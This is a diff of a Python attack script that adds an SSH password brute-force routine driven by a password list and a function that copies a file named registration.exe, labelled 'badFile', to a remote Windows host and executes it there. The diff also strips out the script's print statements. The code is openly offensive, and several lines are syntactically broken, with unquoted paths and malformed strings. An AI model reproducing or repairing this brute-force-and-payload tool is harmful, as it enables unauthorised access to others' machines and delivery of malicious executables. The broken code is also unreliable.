@@ -23,12 +23,13 @@ def encrypt():
 def sniffNetwork():
     ipAddress='192.168.29.141'
     #sniff
+    return ipAddress
 
+# try password list to get the admin SSH password
 def bruteForce(user, ipAddress):
     filepath =open(./passwordlist.txt)
     for i in filepath.readlines():
         secret=i.strip("\n")
-        print(secret)
         s=pxssh.pxssh()
         try:
             s.login(ipAddress, user, secret)
@@ -37,18 +38,16 @@ def bruteForce(user, ipAddress):
         except pxssh.ExceptionPxssh as e:
             time.sleep(1)  
 
-    
-def transferFiles(user, ipAddress, secret ):
-    # badfile ="/directory"
-    os.system(scp badFile r"user@IP:~\C:\Users\IEUser\Downloads\registration.exe")
+# Transfer 
+def transferFiles(user, ipAddress, password ):
+    badfile ="C:\Users\IEUser\Downloads\registration.exe" #local machine
+    os.system(scp badFile r"user@ipAddress:~\C:\Users\IEUser\Downloads\registration.exe") #transfer to remote machine
     try:
         s=pxssh.pxssh()
-        s.login(ipAddress, user, secret)
+        s.login(ipAddress, user, password)
         s.sendline(cd location of file)
         s.sendline(registration.exe)
     except pxssh.Exception.Pxssh as e:
-        print (pxssh failed to login")
-        print (e)
         time.sleep(1)
 
 def main():
